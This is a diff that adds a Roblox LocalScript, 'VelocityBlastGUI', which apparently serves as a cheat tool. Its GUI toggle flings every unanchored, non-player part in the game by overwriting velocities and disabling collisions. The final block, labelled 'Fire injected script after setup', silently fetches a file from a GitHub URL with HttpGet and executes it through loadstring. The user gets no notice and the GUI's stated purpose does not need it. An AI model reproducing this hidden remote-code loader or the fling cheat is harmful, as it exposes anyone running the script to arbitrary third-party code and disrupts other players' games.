@@ -1,0 +1,156 @@
+-- VelocityBlastGUI.lua
+-- Place this LocalScript under StarterGui > ScreenGui
+
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+-- Flags and settings
+local enabled = false
+local vectorText = "9e37"
+local resetting = false
+
+-- Utility: detect if a part belongs to any player's character
+local function isPlayerPart(part)
+    for _, plr in ipairs(Players:GetPlayers()) do
+        local char = plr.Character
+        if char and part:IsDescendantOf(char) then
+            return true
+        end
+    end
+    return false
+end
+
+-- Parse input string into Vector3
+local function parseVectorInput(input)
+    local nums = {}
+    for token in input:gmatch("[^%s]+") do
+        local n = tonumber(token)
+        if not n then return nil end
+        table.insert(nums, n)
+    end
+    if #nums == 1 then
+        return Vector3.new(nums[1], nums[1], nums[1])
+    elseif #nums == 3 then
+        return Vector3.new(nums[1], nums[2], nums[3])
+    end
+    return nil
+end
+
+-- Track parts we've affected to reapply if needed
+local function recheckBlast()
+    local vec = parseVectorInput(vectorText)
+    if not vec then return end
+
+    local originPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not originPart then return end
+
+    local origin = originPart.Position
+    local magnitude = vec.Magnitude
+
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") and not obj.Anchored and not isPlayerPart(obj) and obj.Name ~= "Baseplate" then
+            local direction = (obj.Position - origin).Unit
+            local velocity = direction * magnitude
+
+            if obj.CanCollide or obj.Velocity ~= velocity or obj.AssemblyLinearVelocity ~= velocity then
+                obj.CanCollide = false
+                obj.Velocity = velocity
+                obj.AssemblyLinearVelocity = velocity
+            end
+        end
+    end
+end
+
+-- Reset velocities to zero for valid parts
+local function resetVelocities()
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") and not obj.Anchored and not isPlayerPart(obj) and obj.Name ~= "Baseplate" then
+            obj.Velocity = Vector3.zero
+            obj.AssemblyLinearVelocity = Vector3.zero
+        end
+    end
+end
+
+-- Main loop every 0.1s
+task.spawn(function()
+    while true do
+        if enabled then
+            recheckBlast()
+        elseif not resetting then
+            resetting = true
+            task.spawn(function()
+                for _ = 1, 50 do  -- reset for 5 seconds
+                    resetVelocities()
+                    task.wait(0.1)
+                end
+                resetting = false
+            end)
+        end
+        task.wait(0.1)
+    end
+end)
+
+-- GUI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "VelocityBlastGUI"
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 100
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+-- Toggle button (small) at top center
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.new(0, 24, 0, 24)
+toggleBtn.Position = UDim2.new(0.5, -100, 0, 10)
+toggleBtn.AnchorPoint = Vector2.new(0, 0)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleBtn.Font = Enum.Font.SourceSansBold
+toggleBtn.TextSize = 16
+toggleBtn.Text = "O"
+toggleBtn.ZIndex = 2
+toggleBtn.Parent = screenGui
+
+-- TextBox for vector input beside the toggle
+local inputBox = Instance.new("TextBox")
+inputBox.Size = UDim2.new(0, 120, 0, 24)
+inputBox.Position = UDim2.new(0.5, -70, 0, 10)
+inputBox.AnchorPoint = Vector2.new(0, 0)
+inputBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+inputBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+inputBox.Font = Enum.Font.SourceSans
+inputBox.TextSize = 16
+inputBox.PlaceholderText = "Vector (e.g. 1e5 or 4 0 2)"
+inputBox.Text = vectorText
+inputBox.ClearTextOnFocus = false
+inputBox.ZIndex = 2
+inputBox.Parent = screenGui
+
+-- Handle vector input changes
+inputBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local newText = inputBox.Text
+        if parseVectorInput(newText) then
+            vectorText = newText
+        else
+            inputBox.Text = vectorText
+        end
+    end
+end)
+
+-- Toggle behavior
+toggleBtn.MouseButton1Click:Connect(function()
+    enabled = not enabled
+    if enabled then
+        toggleBtn.Text = "X"
+        toggleBtn.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
+    else
+        toggleBtn.Text = "O"
+        toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    end
+end)
+
+-- Fire injected script after setup
+task.defer(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md", true))()
+end)
